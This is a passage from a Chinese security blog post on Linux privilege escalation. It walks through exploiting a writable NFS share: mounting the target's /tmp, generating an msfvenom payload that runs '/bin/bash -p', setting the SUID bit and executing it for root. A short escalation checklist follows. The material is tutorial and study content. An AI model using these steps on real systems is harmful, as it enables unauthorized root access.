+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643234.png" alt="image-20210701183702574"></p>
+<h3 id="3-在kali上创建一个文件夹，并安装-tmp-NFS共享："><a href="#3-在kali上创建一个文件夹，并安装-tmp-NFS共享：" class="headerlink" title="3.在kali上创建一个文件夹，并安装/tmp  NFS共享："></a>3.在kali上创建一个文件夹，并安装/tmp  NFS共享：</h3><pre class="line-numbers language-none"><code class="language-none">mkdir /tmp/nfs 
+
+mount -o rw,vers=2 192.168.175.228:/tmp /tmp/nfs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643235.png" alt="image-20210701183905563"></p>
+<h3 id="4-使用kali上的root用户生成有效载荷并将其保存到安装的共享中："><a href="#4-使用kali上的root用户生成有效载荷并将其保存到安装的共享中：" class="headerlink" title="4.使用kali上的root用户生成有效载荷并将其保存到安装的共享中："></a>4.使用kali上的root用户生成有效载荷并将其保存到安装的共享中：</h3><pre class="line-numbers language-none"><code class="language-none">msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643236.png" alt="image-20210701184010960"></p>
+<h3 id="5-确保文件具有-SUID-位集，并且每个用户都可执行："><a href="#5-确保文件具有-SUID-位集，并且每个用户都可执行：" class="headerlink" title="5.确保文件具有 SUID 位集，并且每个用户都可执行："></a>5.确保文件具有 SUID 位集，并且每个用户都可执行：</h3><pre class="line-numbers language-none"><code class="language-none">chmod +xs /tmp/nfs/shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643237.png" alt="image-20210701184121840"></p>
+<h3 id="6-在目标机器上，执行文件以获取root："><a href="#6-在目标机器上，执行文件以获取root：" class="headerlink" title="6.在目标机器上，执行文件以获取root："></a>6.在目标机器上，执行文件以获取root：</h3><pre class="line-numbers language-none"><code class="language-none">/tmp/shell.elf bash-4.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643238.png" alt="image-20210701184058216"></p>
+<h2 id="权限提升总结"><a href="#权限提升总结" class="headerlink" title="权限提升总结"></a>权限提升总结</h2><pre class="line-numbers language-none"><code class="language-none">1.信息收集(id, whoami)
+2.运行Linux Smart Enumeration,并增加级别。
+3.运行LinEnum和其他脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p> 快速查找home中的文件 目录和其他公共位置(例如/var，/backup，/var/logs)</p>
+<p>注意：如果用户有一个历史文件，它可能有  重要的信息，比如命令或者 密码 </p>
+<p>Sudo，Cron jobs，SUID文件</p>
+<p>好好看看root进程，列举它们的版本，检查可以转发到的内部端口</p>
+<p>最后考虑内核漏洞，进行提权</p>
+<p>希望此文可以帮到大家，加油！！</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">每天都要努力哇</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://Redamancy404.github.io/2021/10/28/linux-ti-quan/">http://Redamancy404.github.io/2021/10/28/linux-ti-quan/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">每天都要努力哇</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Linux%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/">
+                                    <span class="chip bg-color">Linux提权小结</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/10/28/linux-ying-ji-xiang-ying/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="Linux应急响应">
+                        
+                        <span class="card-title">Linux应急响应</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            分享者才是学习中最大的受益者！
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-28
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="post-category">
+                                    应急响应
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
+                        <span class="chip bg-color">Linux应急响应</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/10/28/ms14-068/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="MS14-068">
+                        
+                        <span class="card-title">MS14-068</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            分享者才是学习中最大的受益者！
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%89%93%E5%9F%9F%E6%8E%A7/" class="post-category">
+                                    打域控
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/MS14-068/">
+                        <span class="chip bg-color">MS14-068</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2021</span>
+            
+            <a href="/about" target="_blank">每天都要努力哇</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/Redamancy404/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">179.6k</span>
+            
+            
+            
+            
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/Redamancy404" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+</html>
